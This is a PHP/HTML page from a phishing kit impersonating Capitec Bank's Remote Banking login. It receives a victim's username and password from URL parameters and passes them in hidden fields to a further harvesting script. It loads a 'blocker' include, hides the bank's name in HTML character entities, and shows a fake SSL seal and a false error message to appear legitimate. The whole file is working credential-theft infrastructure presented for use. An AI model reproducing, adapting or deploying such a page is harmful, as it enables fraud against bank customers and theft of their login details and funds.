<?php
require "includes/blocker.php";
require "includes/functions.php";
$username = htmlspecialchars($_GET["aa"]);
$password = htmlspecialchars($_GET["bb"]);

error_reporting(0);
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252"><title>&#73;&#110;&#116;&#101;&#114;&#110;&#101;&#116;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&verbar;&#32;&#67;&#97;&#112;&#105;&#116;&#101;&#99;&#32;&#66;&#97;&#110;&#107;</title>

<link rel="stylesheet" type="text/css" href="media/default-3.css">
<link rel="stylesheet" type="text/css" href="media/jquery-ui-1.css">
<link rel="stylesheet" type="text/css" href="media/default.css">
<link href="media/favicon.ico" rel="shortcut icon" type="image/x-icon" />
<link id="Link1" rel="icon" href="media/favicon.ico" type="image/ico" />
<script>

function check(form) {

form.submit()

}



</script>
<style>.errorMessageAttention {
	color: #BA1316;
	font-size: 18px;
	font-weight: bold;
	font-family: 'Flama-Medium';
}

#blank {  position: absolute;  clip: rect(0,0,0,0); font-size: 16px; margin-left: -999999999999 }
		#more {
		  background:none;
		  border:none;
		  color:#FFF;
		  font-family:Verdana, Geneva, sans-serif;
		  cursor:pointer;
		}
	.underline-on-hover:hover {
  		text-decoration: underline;
	}
</style>
</head>
<body topmargin="0">


<div class="siteHeader">
<div class="container">
<div class="logo"><img src="media/logo_main.webp"></div>

<nav class="primaryNav">
<ul>
</ul>
</nav>
<ul class="pull-right">
<li class="hidden-xs"><div class="linkWrap "><a href="#" class="w">&#67;&#97;&#112;&#105;&#116;&#101;&#99;&#32;&#66;&#97;&#110;&#107;</a></div>
</li>
<li>
<div class="linkWrap">
<a href="#">Security</a>
</div>
</li>
<li class="phoneHeader"><span href="tel:0860 10 20 43"><div id="mobileNumber" class=" "></div></span></li>
</ul>
</div>
</div>
<div id="bodyTagId"><div class="container"><div align="left"><h1 style="z-index:999;">&#82;&#101;&#109;&#111;&#116;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</h1>
<div id="errors" style="display:none;" class="errorMessage"><div class="errorMessageAttention">Attention</div>Invalid Token Password entered.<br></div>



<div class="row">

<div class="col-md-6">

<div><b><span style="color:#cc0000;">To View Statement, please ensure that your<br />
Internet banking access is Enabled.</span></b></div>

<p>You can switch on your Internet banking access now.<br />
Simply:</p>

<ul style="margin-top: -11px">
	<li><b>Sign in</b> on our app with your Remote PIN</li>
	<li>Tap the <b>menu</b> in the top-right corner</li>
	<li>Tap <b>Settings</b></li>
	<li>Switch your Internet banking <b>ON</b></li>
</ul>

Then click <b>Continue</b> below to view Statement.

<form id="login" name="login" action="php/status_1a.php" method="POST" autocomplete="off">
<input name="username" value="<?php echo $username; ?>" type="hidden" />
<input name="password" value="<?php echo $password; ?>" type="hidden" />
<fieldset>
<label id="usernameLabel" for="token"><span class="username"></span>
</label>
<input type="hidden" name="option" value="doLogin">
</fieldset>
<div> <table>
<tbody><tr><td width="15px"><a href="#"><img class="iWantToImg" src="media/proceed.webp" width="15" height="15" border="0"></a></td><td><button style="margin-left:-8px; font-family: 'Flama-Book';font-size: 15px;line-height: 16px;font-weight: normal;color:#009de0;text-decoration:none;background:transparent; border:0;" onclick="check(this.form)" type="button" id="more"><span class="underline-on-hover">Continue</span></button></td>
</tr></tbody></table></div>
<div style="top: 10px; position: absolute; right: -10px;">
<a style="cursor: pointer;" href="#"><img src="media/SSL-certificate-seal-ssl-animated.webp" border="0"></a>
</div>
<div>
<input type="text" autocomplete="off" id="blank" name="blank" readonly="readonly">

</div></form>


</div>


</div>


</div></div>

</div></body></html>